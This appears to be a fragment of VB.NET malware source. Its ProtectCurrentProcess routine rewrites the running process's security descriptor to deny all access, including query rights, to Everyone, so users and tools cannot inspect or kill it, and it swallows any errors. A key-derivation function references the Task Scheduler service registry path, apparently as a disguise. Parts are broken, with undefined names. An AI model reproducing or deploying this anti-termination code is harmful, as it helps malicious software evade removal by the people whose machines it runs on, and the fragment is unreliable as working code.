Imports Microsoft.VisualBasic
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.Data
Imports System.Diagnostics
Imports System.Runtime.InteropServices
Imports System.Security.AccessControl
Imports System.Security.Principal
Imports System.ComponentModel
Class ProcessAccessRights
    <DllImport("kernel32.dll")> _
    Public Shared Function GetCurrentProcess() As IntPtr
    End Function
    <DllImport("advapi32.dll", SetLastError:=True)> _
    Private Shared Function SetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <[In]()> ByVal pSecurityDescriptor As Byte()) As Boolean
    End Function
    <DllImport("advapi32.dll", SetLastError:=True)> _
    Private Shared Function GetKernelObjectSecurity(ByVal Handle As IntPtr, ByVal securityInformation As Integer, <Out()> ByVal pSecurityDescriptor As Byte(), ByVal nLength As UInteger, ByRef lpnLengthNeeded As UInteger) As Boolean
    End Function
    <Flags()> _
    Public Enum ProcessAccessRights
        PROCESS_QUERY_LIMITED_INFORMATION = &H1000
        SYNCHRONIZE = &H100
        STANDARD_RIGHTS_REQUIRED = &HF0000
        PROCESS_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED Or SYNCHRONIZE Or &HFFF)
    End Enum

    Public Shared Sub ProtectCurrentProcess()
        Try
            Dim hProcess As IntPtr = GetCurrentProcess()
            Dim dal = ParseProcDescriptor(hProcess)
            dal.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(ProcessAccessRights.PROCESS_ALL_ACCESS), New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
            dal.DiscretionaryAcl.InsertAce(0, New CommonAce(AceFlags.None, AceQualifier.AccessDenied, Convert.ToInt32(ProcessAccessRights.PROCESS_QUERY_LIMITED_INFORMATION), New SecurityIdentifier(WellKnownSidType.WorldSid, Nothing), False, Nothing))
            EditProcDescriptor(hProcess, dal)
        Catch : End Try
    End Sub
    Public Shared Function GetDecKey() As String
        Dim key As String
        key = Schelder
        key = key.Replace("\", "/")
        key = AES_Encrypt(key, "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule")
        Return key
    End Function
    Public Shared Function ParseProcDescriptor(ByVal processHandle As IntPtr) As RawSecurityDescriptor

        Const dal_SECURITY_INFORMATION As Integer = &H4
        Dim buff As Byte() = New Byte(-1) {}
        Dim setblock As UInteger = 0
        GetKernelObjectSecurity(processHandle, dal_SECURITY_INFORMATION, buff, 0, setblock)
        If setblock < 0 OrElse setblock > Short.MaxValue Then
            Throw New Win32Exception()
        End If
        If Not GetKernelObjectSecurity(processHandle, dal_SECURITY_INFORMATION, InlineAssignHelper(buff, New Byte(setblock - 1) {}), setblock, setblock) Then
            Throw New Win32Exception()
        End If
        Return New RawSecurityDescriptor(buff, 0)

    End Function
    Public Shared Sub EditProcDescriptor(ByVal processHandle As IntPtr, ByVal dal As RawSecurityDescriptor)

        Const dal_SECURITY_INFORMATION As Integer = &H4
        Dim rawsd As Byte() = New Byte(dal.BinaryLength - 1) {}
        dal.GetBinaryForm(rawsd, 0)
        If Not SetKernelObjectSecurity(processHandle, dal_SECURITY_INFORMATION, rawsd) Then
            Throw New Win32Exception()
        End If
    End Sub
    Private Shared Function InlineAssignHelper(Of T)(ByRef app As T, ByVal ret As T) As T
        app = ret
        Return ret
    End Function
End Class
